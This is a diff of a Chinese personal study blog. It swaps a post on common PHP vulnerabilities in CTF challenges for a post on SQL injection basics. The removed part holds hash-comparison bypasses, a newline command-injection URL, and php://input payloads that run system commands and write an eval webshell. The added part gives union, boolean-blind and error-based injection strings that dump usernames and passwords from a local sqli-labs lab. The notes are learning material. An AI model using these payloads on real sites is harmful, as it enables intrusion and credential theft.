@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php常见漏洞, Amy">
+    <meta name="keywords" content="sql注入原理及sqlmap的使用, Amy">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php常见漏洞 | Amy</title>
+    <title>sql注入原理及sqlmap的使用 | Amy</title>
     <link rel="icon" type="image/svg+xml" href="/favicon.svg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -205,12 +205,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205152774.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php常见漏洞</h1>
+                    <h1 class="description center-align post-title">sql注入原理及sqlmap的使用</h1>
                 </div>
             </div>
         </div>
@@ -351,7 +351,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-26
+                    2020-11-28
                 </div>
                 
 
@@ -365,14 +365,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3k
+                    3.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    12 分
+                    13 分
                 </div>
                 
 
@@ -395,225 +395,206 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="ctf中常见的php漏洞"><a href="#ctf中常见的php漏洞" class="headerlink" title="ctf中常见的php漏洞"></a>ctf中常见的php漏洞</h2><p>刷题的时候遇到一些php代码审计的题目，其中也都一些是自己没遇到过，从网络上搜集的。</p>
-<h3 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h3><pre class="line-numbers language-none"><code class="language-none">$_POST // 获取 post 数据，是一个字典
-$_GET // 获取 get 数据，是一个字典
-$_COOKIE // 获取 cookie
-$_SESSION // 获取 session
-$_FILE // 获取上传的文件
-$_REQUEST // 获取 $_GET，$_POST，$_COOKIE 中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="错误控制运算符"><a href="#错误控制运算符" class="headerlink" title="错误控制运算符"></a>错误控制运算符</h3><p>PHP 支持一个错误控制运算符：@。当将其放置在一个PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p>
-<h3 id="弱类型漏洞"><a href="#弱类型漏洞" class="headerlink" title="弱类型漏洞"></a>弱类型漏洞</h3><p>PHP是弱类型语言，不须要明确的定义变量的类型，变量的类型根据使用时的上下文所决定，也就是变量会根据不一样表达式所须要的类型自动转换，好比求和，PHP会将两个相加的值转为long、double再进行加和。每种类型转为另一种类型都有固定的规则，当某个操做发现类型不符时就会按照这个规则进行转换，这个规则正是弱类型实现的基础。</p>
-<h4 id="和-的区别"><a href="#和-的区别" class="headerlink" title="==和===的区别"></a>==和===的区别</h4><pre class="line-numbers language-none"><code class="language-none">==  会在比较的时候装化成相同的类型
-=== 先判断左右两者类型是否相等之后再作比较（这个更严格一些）
-整数和字符串进行比较的时候，字符串数字后的内容会被省略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h4><p>当数组(array)与任何非数组进行比较时，数组老是最大的</p>
-<h4 id="bool类型比较"><a href="#bool类型比较" class="headerlink" title="bool类型比较"></a>bool类型比较</h4><p>bool类型的true跟任意字符能够弱类型相等</p>
-<h4 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h4><p>1.md5()绕过<code>==</code></p>
-<p> PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>		<span class="token comment">//bool(true)</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token number">240610708</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	    <span class="token comment">//bool(false)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>上面两个值可以使md5()的开头为0e，经过<code>==</code>弱类型比较可输出‘yes’，但没法经过<code>===</code></p>
-<p>经常使用md5()开头为“0e”的字符：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span>			<span class="token comment">//0e830400451993494058024219903391</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'240610708'</span><span class="token punctuation">)</span>			<span class="token comment">//0e462097431906509019562988736854</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e545993274517709034328855841020</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s155964671a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e342768416822451524974117254469</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s214587387a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e848240448830537924465865611904</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e545993274517709034328855841020</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1091221200a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e940624217856561557816327384675</span>
-<span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1885207154a'</span><span class="token punctuation">)</span>		<span class="token comment">//0e509367213418206700842008763514</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>2.md5([])绕过<code>===</code></p>
-<p>因为md5()函数不能处理数组，因此在md5()遇到数组时会警告而且返回null，然而能够忽略警告并经过数组绕过<code>===</code>，以下：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment">//bool(true)</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment">//bool(true)，@表示忽略警告</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//bool(true)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><code>ffifdyop</code>，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p>
-<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p>
-<h4 id="sha1-函数"><a href="#sha1-函数" class="headerlink" title="sha1()函数"></a>sha1()函数</h4><p>sha1()与md5()基本原理相同，因此此处仅列出sha1()开头为“0e”的字符串。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaroZmOk'</span><span class="token punctuation">)</span>	<span class="token comment">//0e66507019969427134894567494305185566735</span>
-<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaK1STfY'</span><span class="token punctuation">)</span>	<span class="token comment">//0e76658526655756207688271159624026011393</span>
-<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaO8zKZF'</span><span class="token punctuation">)</span>	<span class="token comment">//0e89257456677279068558073954252716165668</span>
-<span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa3OFF9m'</span><span class="token punctuation">)</span>	<span class="token comment">//0e36977786278517984959260394024281014729</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="strcmp-、strcasecmp-函数"><a href="#strcmp-、strcasecmp-函数" class="headerlink" title="strcmp()、strcasecmp()`函数"></a>strcmp()、strcasecmp()`函数</h4><ul>
-<li><p><code>strcmp(string1, string2)</code>、<code>strcasecmp(string1, string2)</code></p>
-<p>比较两个字符串，前者不区分大小写，后者区分大小写。若<code>string1 &gt; string2</code>，返回<code>&gt; 0</code>；若<code>string1 &lt; string2</code>，返回<code>&lt; 0</code>;若<code>string1 = string2</code>，返回<code>0</code>。然而该函数没法处理数组，当出现数组时，返回<code>null</code>。(下例中@表示忽略警告)</p>
-<pre class="line-numbers language-none"><code class="language-none">var_dump(@strcmp([],1));				//NULL
-var_dump(@strcmp([],'flag') == 0);	//bool(true)
-var_dump(@strcmp([],'flag') === 0);	//bool(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h4></li>
-</ul>
-<p><code>intval()</code> 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，<code>intval()</code> 不会报错而是返回 0。</p>
-<pre class="line-numbers language-none"><code class="language-none">var_dump(intval('2')) // 2
-var_dump(intval('3abcd')) // 3
-var_dump(intval('abcd')) // 0
+                <p>mysql数据库刚刚学完,学的都是开发用到的建表,增删查改,存储过程之类的知识</p>
+<p>现在来学习学习sql注入.</p>
+<p>sql注入也是基于基础的sql语句来实现对数据库系统的恶意操做的</p>
+<h3 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h3><p>首先是<strong>sql注入要满足的条件及原理</strong>:</p>
+<p>1.参数可控:就是可以自定义传入的参数</p>
+<p>2.参数要可以带到数据库查询:传入的参数所拼接成的sql语句,必须带入数据库查询</p>
+<p>在做数据库实验的过程中也发现mysql会有个默认的information_schema数据库,里面有好多好东西啊,在一些表里面可以看到所有的数据库名,表名,还有其他一些数据库的信息。</p>
+<p>还有一些有用的函数,可以查看数据库的基本信息,都用得到</p>
+<pre class="line-numbers language-none"><code class="language-none">@@datadir: 查询数据库的物理路径
+@@version: 查询数据库版本
+version(): 
+database(): 查看数据库名
+user(): 查看mysql用户
+limit m,n: 从m条记录开始取n条记录
+......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="构造闭合语句"><a href="#构造闭合语句" class="headerlink" title="构造闭合语句"></a>构造闭合语句</h3><p>sql注入需要将前面的语句闭合起来或者是形成自己的sql语句,可以有一下几种方式:</p>
+<p>‘ (单引号)可以把id括起来，使前面的语句闭合</p>
+<p>构造语句的时候，一是要把我们构造的语句释放出来，二是要把结构进行补全或者适当的注释。</p>
+<p>注释可以用–+;– -;#把后面的’或者多余的修饰符注释掉，当然不同数据库的注释方法也不尽相同。</p>
+<p>/<em>!</em>/ (内联注释可以放在整个sql语句中)</p>
+<p>下面是一些常用的结构</p>
+<pre class="line-numbers language-none"><code class="language-none">or 1=1--+ 
 
-var_dump(0 == '0'); // true
-var_dump(0 == 'abcdefg'); // true 
-var_dump(0 === 'abcdefg'); // false
-var_dump(1 == '1abcdef'); // true
+'or 1=1--+ 
 
-if(intval($a) &gt; 1000) {
-    mysql_query("select * from news where id=".$a)
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><p>trim 函数会过滤空格以及 \n\r\t\v\0，但不会过滤过滤\f</p>
-<pre class="line-numbers language-none"><code class="language-none">$a = "  \n\r\t\v\0abc  \f";
-var_dump(trim($a)); // abc  \f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>可以在这个网站学习学习正则[regex]:(<a target="_blank" rel="noopener" href="https://regexr.com/">https://regexr.com/</a>)</p>
-<h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h4><p>preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(<code>^</code> 和 <code>$</code>)，则可以存在绕过的问题</p>
-<pre class="line-numbers language-none"><code class="language-none">$ip = '1.1.1.1 abcd'; // 可以绕过
-if(!preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/",$ip)) {
-  die('error');
-} else {
-  // echo('key...')
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>pre_match 在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，如果传入一个超长的字符串，会导致 pre_match 消耗大量资源从而导致 php 超时，后面的 php 语句就不会执行。payload:</p>
-<pre class="line-numbers language-none"><code class="language-none">$code="xdsec###AAAAAAAAAAAAAAAAAAA(超多个A)";
-preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/", $code));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>就是匹配文件名由字母、数字、下划线、破则号、斜杠、空白字符各种组合的并且后缀名是rpt的文件，如果匹配成功，就执行系统命令file打印文件的类型和编码信息，如果匹配失败就打印’regex failed’.</p>
-<p>[<a target="_blank" rel="noopener" href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami%5D">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami]</a>(<a target="_blank" rel="noopener" href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p>
-<p>如果开启了/m，会存在绕过</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-$file_name=$_GET['path'];
-if (!preg_match("/^[a-zA-Z0-9-s_]+.rpt$/m", $file_name)) {
-  echo "regex failed";
-} else {
-    echo exec("/usr/bin/file -i -b ".$file_name);
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>注意到正则表达式结尾的/m 了，在php中，/m表示开启多行匹配模式，开启多行匹配模式之后<code>^</code>和<code>$</code>的含义就发生了变化，没开启多行模式之前(即单行匹配模式), <code>^</code> 和<code>$</code> 是匹配字符串的开始和结尾，开启多行模式之后，多行模式<code>^</code>,<code>$</code>可以匹配每行的开头和结尾，所以上述payload里面含有换行符，被当做两行处理，一行匹配OK即可，所以进入了exec执行分支，进而导致命令执行。</p>
-<p>[<a target="_blank" rel="noopener" href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami%5D">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami]</a>(<a target="_blank" rel="noopener" href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p>
-<p>开启/m</p>
-<pre class="line-numbers language-none"><code class="language-none">^ 行首
-$ 行尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+"or 1=1--+ 
+
+)or 1=1--+ 
+
+')or 1=1--+ 
+
+") or 1=1--+ 
+
+"))or 1=1--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
-<p>不开启/m</p>
-<pre class="line-numbers language-none"><code class="language-none">^ 字符串的开始
-$ 字符串的结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>修饰符说明</p>
-<pre class="line-numbers language-none"><code class="language-none">i 在和正则匹配是不区分大小写 
-m 将字符串视为多行。默认的正则开始“^”和结束“$”将目标字条串作为一单一的一“行”字符（甚至其中包括换行符也是如此）。如果在修饰符中加上“m”，那么开始和结束将会指点字符串的每一行的开头就是“^”结束就是“$”。 
-o 评估表达式只有一次
-s 如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。 
-x 忽略空白，除非进行转义的不被忽略。 
-g 在全局范围内找到所有匹配
-cg 即使全局匹配失败也允许搜索继续<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h4><p>正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE</p>
-<h4 id="ereg-00-截断"><a href="#ereg-00-截断" class="headerlink" title="ereg %00 截断"></a>ereg %00 截断</h4><p>ereg 读到 %00 的时候，就截止了</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-    if (ereg ("^[a-zA-Z]+$", $_GET['a']) === FALSE)  {
-        echo 'You password must be alphabet';
-    }
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这里 <code>a=abcd%001234</code>，可以绕过</p>
-<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><h4 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h4><p>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php  
-    $auth = '0';  
-    // 这里可以覆盖$auth的变量值
-    extract($_GET); 
-    if($auth == 1){  
-        echo "private!";  
-    } else{  
-        echo "public!";  
-    }  
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h4><p>parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p>
-<pre class="line-numbers language-none"><code class="language-none">//var.php?var=new  
-$var='init';  
-parse_str($_SERVER['QUERY_STRING']);
-// $var 会变成 new
-echo $var;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$ 变量覆盖"></a>$$ 变量覆盖</h4><p>如果把变量本身的 key 也当变量，也就是使用了 <code>$$</code>，就可能存在问题。</p>
-<pre class="line-numbers language-none"><code class="language-none">$_ = '_POST';
-// $$_ 是等于 $_POST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>例子</p>
-<pre class="line-numbers language-none"><code class="language-none">// http://127.0.0.1/index.php?_CONFIG=123
-$_CONFIG['extraSecure'] = true;
- 
-foreach(array('_GET','_POST') as $method) {
-    foreach($$method as $key=&gt;$value) {
-      // $key == _CONFIG
-      // $$key == $_CONFIG
-      // 这个函数会把 $_CONFIG 变量销毁
-      unset($$key);
-    }
-}
- 
-if ($_CONFIG['extraSecure'] == false) {
-    echo 'flag {****}';
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>数组类型数据的覆盖</p>
-<pre class="line-numbers language-none"><code class="language-none">// index.php?_SESSION[userinfo][id]=1&amp;_SESSION[userinfo][username]=admin
-
-foreach (array('_COOKIE','_POST','_GET') as $_request)  
-{
-    foreach ($$_request as $_key=&gt;$_value)  
-    {
-        $$_key=  $_value;
-    }
-}
-
-echo $_SESSION["userinfo"]["id"];
-echo '&lt;br&gt;';
-echo $_SESSION["userinfo"]["username"];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>但是如果后面有 <code>session_start()</code> 会重新初始化上面的 <code>$_SESSION</code> 数据，因此又被还原回去。</p>
-<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这四个函数会将包含的文件作为php文件解析</p>
-<p>_once表示同名文件只引入一次，include在引入不存文件时产生一个警告且脚本还会继续执行，require则会导致一个致命性错误且脚本停止执行。<br>include()是有条件包含函数，而 require()则是无条件包含函数<br>include有返回值，而require没有<br>理论上来说：include和require后面加不加括号对执行结果没有区别，但是加上括号效率较低，所以后面能不加括号就不加括号。</p>
-<p>可利用的文件包含漏洞条件：<br>1.include()等函数通过动态变量方式引入需要包含的文件<br>2.用户可控制该动态变量</p>
-<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>涉及的相关协议：<code>file://</code>、<code>php://filter</code>、<code>php://input</code>、<code>zip://</code>、<code>compress.bzip2://</code>、<code>compress.zlib://</code>、<code>data://</code></p>
-<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><ul>
-<li><p>简介<br><code>php://</code>:是个能够访问请求的原始数据的只读流。POST请求的状况下，最好用<code>php://input</code>来代替<code>$HTTP_RAW_POST_DATA</code>，由于他不依赖于特定的<code>php.ini</code>指令，并且，这样的状况下<code>$HTTP_RAW_POST_DATA</code>默认没有填充，比激活<code>always_populate_raw_post_data</code>潜在须要更少的内存，<code>enctype="multipart/form-data"</code>的时候<code>php://input</code>是无效的。</p>
-<p>简单理解：除<code>enctype="multipart/form-data"</code>外，获取POST数据（可做为php代码执行）。</p>
+<h3 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h3><h4 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h4><p>感觉思路是比较清晰的，一步一步的扩大对数据库的查询范围，最后获取到有用信息。就是order by查字段有点烦</p>
+<p>一般的union注入感觉都可以安装这个步骤来：</p>
+<p>1.先找到闭合规则</p>
+<p>2.然后用order by子句查询属性列的字段数,也就是看有多少列</p>
+<p>3.接着就可以获取database()了，先把id换成-1，数据库没有id=-1的数据，这样就可以把所有select起来的数据都显示出来</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以看到当前的数据库是security</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201220521.png" alt="image-20210208201220521"></p>
+<p>4.查表名</p>
+<p>因为当时union select出来的数据显示2，3</p>
+<p>所以可以在原来2，3的位置插入sql语句，但要用（）将要插入的sql语句包起来</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema ='security'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>5.查用户属性也就是字段</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以发现有三个属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201234242.png" alt="image-20210208201234242"></p>
+<p>6.查完属性就可以查列了，把username全部调出来</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(username) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201319502.png" alt="image-20210208201319502"></p>
+<p>7.最后就是查用户密码了</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(password) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p>感觉这个全靠猜，但是猜也得讲究技巧呀，比如可以用数据结构学过的二分法去搞</p>
+<p>1.先判断是不是Boolean盲注，如果能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，Boolean顾名思义只存在两种状态，对或错，你看不到任何信息，只有true or false</p>
+<p>比如这题，猜对了只有You are in 显示，猜错了就啥也没有</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201358085.png" alt="image-20210208201358085"></p>
+<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=1 --+ 正常
+http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=2 --+ 正常
+http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=2 --+ 不正常
+http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=1 --+ 正常
+综上可以判断是字符串盲注了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2.根据返回状态判断闭合规则</p>
+<p>3.<strong>经常用到的就是length()和substr()语句，来猜数据库、表名等的长度和正确字母；</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">length()：返回字符串的长度
+substr(str,pos,num) ：截取指定位置指定长度的字符串
+mid(str,pos,num) :截取指定位置指定长度的字符串
+ascii() 查询ascii码中对应的值
+char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ol>
+<li><p>只要注入点有sql报错信息，就可以使用报错注入；</p>
 </li>
-<li><p>使用条件</p>
+<li><p>还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；</p>
 </li>
-<li><p>范例</p>
-<p>环境：</p>
-<pre class="line-numbers language-none"><code class="language-none">//input.php
-&lt;?php
-include($_GET[file]);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>应用：</p>
-<pre class="line-numbers language-none"><code class="language-none">//payload
-[GET DATA]:   input.php?file=php://input
-[POST DATA 1]:&lt;?php phpinfo();?&gt;
-[POST DATA 2]:&lt;?php system('ls');?&gt;
-[POST DATA 3]:&lt;?php fputs(fopen("shell.php","w"),'&lt;?php @eval($_POST[cmd]);?&gt;');?&gt;	#我没写入成功，缘由待查。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:filter"></a>php:filter</h4></li>
